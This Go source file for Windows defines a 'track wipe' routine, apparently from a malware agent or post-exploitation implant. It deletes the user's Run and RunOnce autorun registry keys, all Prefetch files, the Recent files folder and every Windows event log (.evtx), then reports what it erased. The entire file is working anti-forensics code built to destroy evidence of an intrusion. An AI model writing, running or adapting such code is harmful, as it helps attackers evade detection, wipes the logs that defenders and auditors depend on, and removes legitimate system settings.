//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// wipeTracks removes registry autorun entries, prefetch, and recent file access traces.
func wipeTracks() string {
	var results []string

	// Remove agent registry persistence entries
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	deleteKey := advapi32.NewProc("RegDeleteKeyW")
	openKey := advapi32.NewProc("RegOpenKeyExW")

	runPaths := []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
	}

	for _, path := range runPaths {
		pathPtr, _ := syscall.UTF16PtrFromString(path)
		var hKey uintptr
		ret, _, _ := openKey.Call(0x80000001, uintptr(unsafe.Pointer(pathPtr)), 0, 0x02000000, uintptr(unsafe.Pointer(&hKey)))
		if ret == 0 {
			deleteKey.Call(hKey, 0)
		}
	}
	results = append(results, "registry persistence entries removed")

	// Clear prefetch files
	pfDir := filepath.Join(os.Getenv("SYSTEMROOT"), "Prefetch")
	if entries, err := os.ReadDir(pfDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				os.Remove(filepath.Join(pfDir, e.Name()))
			}
		}
		results = append(results, "prefetch cleared")
	}

	// Clear recent files
	recentDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	if entries, err := os.ReadDir(recentDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				os.Remove(filepath.Join(recentDir, e.Name()))
			}
		}
		results = append(results, "recent files cleared")
	}

	// Clear Windows event trace logs
	etlFiles, _ := filepath.Glob(filepath.Join(os.Getenv("SYSTEMROOT"), "System32", "winevt", "Logs", "*.evtx"))
	for _, f := range etlFiles {
		os.Remove(f)
		results = append(results, fmt.Sprintf("removed %s", filepath.Base(f)))
	}

	return fmt.Sprintf("track_wipe: %v", results)
}
